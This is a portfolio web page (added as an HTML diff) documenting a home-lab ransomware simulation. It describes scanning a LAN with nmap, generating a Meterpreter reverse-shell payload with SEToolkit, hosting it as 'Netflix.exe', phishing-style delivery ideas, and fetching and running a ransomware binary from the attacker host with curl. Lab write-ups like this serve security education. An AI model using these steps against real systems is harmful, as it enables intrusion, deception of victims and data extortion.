@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Project Portfolio</title><!--<p>OTP</p>-->
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="projectsMediaQueries.css">
+  </head>
+  <body>
+    <nav id="desktop-nav">
+      <div class="logo"><a href="index.html" style="text-decoration: none;">Taufiq Saha Hamza</a></div>
+      <div>
+        <ul class="nav-links">
+          <li><a href="#about">About</a></li>
+          <li><a href="#experience">Experience</a></li>
+          <li><a href="projects.html">Projects</a></li>
+          <li><a href="#contact">Contact</a></li>
+        </ul>
+      </div>
+    </nav>
+    <nav id="hamburger-nav">
+      <div class="logo"><a href="index.html" style="text-decoration: none;">Taufiq Saha Hamza</a></div>
+      <div class="hamburger-menu">
+        <div class="hamburger-icon" onclick="toggleMenu()">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+        <div class="menu-links">
+          <li><a href="#about" onclick="toggleMenu()">About</a></li>
+          <li><a href="#experience" onclick="toggleMenu()">Experience</a></li>
+          <li><a href="#projects" onclick="toggleMenu()">Projects</a></li>
+          <li><a href="#contact" onclick="toggleMenu()">Contact</a></li>
+        </div>
+      </div>
+    </nav>
+    
+    <section id="about">
+      <p class="section__text__p1">Documentation</p>
+      <h1 class="title">Ransomeware Simulation Documentation</h1>
+      <img src="assets/project-1.jpg" class="about-pic" style="height: 200px; justify-content: center; align-items: center; position: relative;left: 500px;">
+      <p class="section__text__p1"> <span style="color: red;">****</span>Deskptop Required. Mobile MediaQueries Errors <span style="color: red;">****</span></p>
+      <br><br><br>
+      <h1 class="title">Brief Overview</h1>
+      <div class="section-container">
+        <div class="section__pic-container">
+          <img
+            src="./assets/ransomwareSim/1.png"
+            alt="Profile picture"
+            class="about-pic"
+          />
+        </div>
+      </div>
+      
+      <div class="section-container" style="margin-top: -200px;">
+        <div class="about-details-container">
+          <div class="text-container">
+            <p>This project was designed to demonstrate how attackers carry out a ransomeware attack with the aid of a reverse shell connection.
+              The first step is to identify the IP address of the Kali machine to understand the subnet of the LAN. With this information, we can run an Nmap scan. In this setup, the LAN IP range is 192.168.1.0/24, so the Nmap command will be:
+                  <br><br> <h3>nmap -sV 192.168.1.0/24</h3><br><br>
+              This Nmap scan will identify all endpoints on the network, collecting details such as IP addresses, operating systems, open ports, and the version of services running. Using this, we can locate the Windows machine (the target) based on services commonly associated with Windows systems.
+
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="section-container" style="justify-content: center; align-items: center; margin-top: -220px;">
+        <div class="section__pic-container">
+          <img
+            src="./assets/ransomwareSim/2.png"
+            alt="Profile picture"
+            class="about-pic"
+          />
+        </div>
+      </div>
+      
+      <div class="section-container" style="margin-top: -250px;">
+        <div class="about-details-container">
+          <div class="text-container">
+            <p>
+              we will use the Social Engineering Toolkit (SEToolkit) to create the payload. Start by launching setoolkit in terminal, then select Option 1 for Social Engineering, Option 4 to create a payload and listener, and Option 2 for Windows Reverse_TCP Meterpreter. Configure the payload by entering the IP address of your Kali machine and choosing a port below 1000, such as 88, to simplify the setup.
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="section-container" style="margin-top: -250px;">
+        <div class="section__pic-container">
+          <img
+            src="./assets/ransomwareSim/3.png"
+            alt="Profile picture"
+            class="about-pic"
+          />
+        </div>
+      </div>
+      
+      <div class="section-container" style="margin-top: -200px;">
+        <div class="about-details-container">
+          <div class="text-container">
+            <p>To host the payload for easy access, first check the status of the Apache2 server with <br><br><h3>service apache2 status</h3><br><br>  and ensure it’s off with service apache2 stop. Copy the payload file to the Apache web directory with cp /root/.set/payload.exe /var/www/html/Netflix.exe, then start the server using service apache2 start and confirm it’s running with another status check. With the Apache2 server active, files can now be accessed and shared over the network by users on the same LAN.</p>
+          </div>
+        </div>
+      </div>
+      <div class="section-container" style="justify-content: center; align-items: center; margin-top: -220px;">
+        <div class="section__pic-container">
+          <img
+            src="./assets/ransomwareSim/4.png"
+            alt="Profile picture"
+            class="about-pic"
+          />
+        </div>
+      </div>
+      
+      <div class="section-container" style="margin-top: -250px;">
+        <div class="about-details-container">
+          <div class="text-container">
+            <p>To access the hosted payload, you can use methods like shortening the download link with Bitly or embedding it in a phishing email as a .ps1 script, .exe file, or hidden within a PDF. For this project, we’ll download the payload manually by navigating to <br><br><h3>192.168.1.102/Netflix.exe</h3><br>  on the Windows machine, confirming any security warnings, and running the executable.</p>
+          </div>
+        </div>
+      </div>
+      <div class="section-container" style="margin-top: -250px;">
+        <div class="section__pic-container">
+          <img
+            src="./assets/ransomwareSim/5.png"
+            alt="Profile picture"
+            class="about-pic"
+          />
+        </div>
+      </div>
+      
+      <div class="section-container" style="margin-top: -200px;">
+        <div class="about-details-container">
+          <div class="text-container">
+            <p>Once the payload is executed, a session opens in Meterpreter, allowing the attacker to connect using sessions -i 1. With shell access, the ransomware attack begins by downloading the payload via <br><br><h3>curl -O 192.168.1.102/CashCat.exe</h3><br>  and executing it with start CashCat.exe. This renames files with an unusable extension (e.g., .porno), rendering them inaccessible. To restore access, entering the decryption key 123456789 reverts the files to their original names. This demonstration is for educational purposes only, focusing on ethical hacking practices and showcasing cybersecurity tools and techniques.</p>
+          </div>
+        </div>
+      </div>
+      <div class="section-container" style="justify-content: center; align-items: center; margin-top: -220px;">
+        <div class="section__pic-container">
+          <img
+            src="./assets/ransomwareSim/6.png"
+            alt="Profile picture"
+            class="about-pic"
+          />
+        </div>
+      </div>
+      
+      <div class="section-container" style="margin-top: -250px;">
+        <div class="about-details-container">
+          <div class="text-container">
+            <p>
+              <span style="color: red;">****</span>This demonstration is strictly for educational purposes, emphasizing ethical hacking practices. This project serves to showcase proficiency with cybersecurity tools, scripting languages, and general knowledge of cybersecurity techniques.<span style="color: red;">****</span>
+
+              <br><br>
+
+              <span style="color: red;">****</span>Click Below to access the full and complete documentation. This project is subject to revisions, additions and imporvements to make the project as complex and realstic as per real life experiences<span style="color: red;">****</span>
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="contact" style="margin-top: -250px;">
+      <p class="section__text__p1">Documentation PDF</p>
+      <h1 class="title">Read Detailed Documentation</h1>
+      <div class="contact-info-upper-container">
+        <div class="contact-info-container">
+          <img
+            src="./assets/download.png"
+            alt="Email icon"
+            class="icon contact-icon email-icon"
+          />
+          <p><a href="/assets/Ransomware Training Project Live Lab documentation.pdf" style="text-decoration: none;">Ransomeware Simulation Documentation</a></p>
+        </div>
+      </div>
+    </section>
+    <footer>
+      <nav>
+        <div class="nav-links-container">
+          <ul class="nav-links">
+            <li><a href="#about">About</a></li>
+            <li><a href="#experience">Experience</a></li>
+            <li><a href="projects.html">Projects</a></li>
+            <li><a href="#contact">Contact</a></li>
+          </ul>
+        </div>
+      </nav>
+      <p>&#169; 2024 Bytepath Technologies.</p>
+    </footer>
+    <script src="script.js"></script>
+  </body>
+</html>
